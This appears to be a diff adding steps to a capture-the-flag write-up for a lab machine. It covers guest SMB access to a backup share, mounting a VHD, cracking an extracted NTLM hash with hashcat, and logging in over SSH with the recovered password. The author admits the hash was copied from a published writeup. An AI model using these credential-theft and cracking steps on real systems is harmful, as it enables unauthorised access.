@@ -1,7 +1,7 @@
 ### Index
 1.  Initial Nmap Enumeration
 2.  SMB Enumeration - Port 139,445
-3. RPC Enumeration - Port 135 -  `593 as well but that port is not open`
+3. Cracking the hash using hashcat
 
 ### Initial Nmap Enumeration
 
@@ -300,8 +300,80 @@ Server type string: null
 Completed after 8.39 seconds
 ```
 
-Again nothing Interesting. 
+Again nothing Interesting. Let's explore the SMB Share. We found two .vhd files. VHD files are the disk backup files on Windows. Let's grab those 2 VHD files and mount it on Kali Linux.
+```
+$ smbclient -no-pass -U "guest" //10.10.10.134/Backups
+Password for [WORKGROUP\guest]:
+Try "help" to get a list of possible commands.
+smb: \> cd "WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351"
+smb: \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\> dir
+  .                                  Dn        0  Fri Feb 22 07:45:32 2019
+  ..                                 Dn        0  Fri Feb 22 07:45:32 2019
+  9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd     An 37761024  Fri Feb 22 07:44:03 2019
+  9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd     An 5418299392  Fri Feb 22 07:45:32 2019
+  BackupSpecs.xml                    An     1186  Fri Feb 22 07:45:32 2019
+  cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml     An     1078  Fri Feb 22 07:45:32 2019
+  cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml     An     8930  Fri Feb 22 07:45:32 2019
+  cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml     An     6542  Fri Feb 22 07:45:32 2019
+  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml     An     2894  Fri Feb 22 07:45:32 2019
+  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml     An     1488  Fri Feb 22 07:45:32 2019
+  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml     An     1484  Fri Feb 22 07:45:32 2019
+  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml     An     3844  Fri Feb 22 07:45:32 2019
+  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml     An     3988  Fri Feb 22 07:45:32 2019
+  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml     An     7110  Fri Feb 22 07:45:32 2019
+  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml     An  2374620  Fri Feb 22 07:45:32 2019
 
+                5638911 blocks of size 4096. 1175237 blocks available
+smb: \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\> 
 
+smb: \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\> get 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
 
-### RPC Enumeration - Port 135
+```
+
+Looking at the VHD file size, It is too large to get using smbclient. I tried like 40+ times with smbclient and smbmap. I was not able to download the `9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd` file. At last, I dig up on internet and found that i can simply mount the Backup Share on my local kali and perform the CP command.  
+
+The Following Command was used to mount the `//10.10.10.134/Backups` share on to Local Kali Linux
+
+```
+$ sudo mount -t cifs //10.10.10.134/backups /mnt/Backup -o user=,password=
+
+$ ls /mnt/Backup              
+GNTBWRSCGL.txt  note.txt  SDT65CB.tmp  WindowsImageBackup
+
+```
+
+Mounting the `9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd` into Local Kali Linux.
+
+```
+$ sudo guestmount --add '/mnt/Backup/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd' --inspector -v --ro /mnt/vhd2
+```
+
+At this point, My connection to the VM was kept dropping and I was not able to mount the `9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd` file. I ended up trying some different methods like copying the VHD to local drive but due to the huge file size, it was not an option. 
+
+**At this point, I made sure that I am digging the correct path. So I looked up the Writeup and got the hash from the SAM file and save it to my local directory. The purpose of mounting the VHD file is to obtained the SAM file and use the hashcat to decrypt the password for the user L4mpje. The Part where Mount and getting the SAM file is skipped in this note due to connection drop. I verified my steps with the Writeup and made sure I was following the correct path.**
+
+### Cracking the hash using Hashcat
+
+I obtained the hash and save it as a txt file on my kali. Following to that, I used hashcat to crack the hash.
+
+```
+$ more hash.txt 
+L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
+
+$ hashcat -m 1000 -a 0 sam_hash.txt /usr/share/wordlists/rockyou.txt --show
+26112010952d963c8dc4217daec986d9:bureaulampje
+```
+
+At this point, i tried `evil-winrm` however, i was not able to get the Prompt. I notice that the `22/tcp` is open during the initial Nmap scan. So trying out the simple SSH.
+
+```
+$ ssh L4mpje@10.10.10.134          
+L4mpje@10.10.10.134's password:
+Microsoft Windows [Version 10.0.14393]                                                                                          
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+l4mpje@BASTION C:\Users\L4mpje\Desktop>type user.txt             
+1798f64e4*****************  
+```
+
+Got the User flag
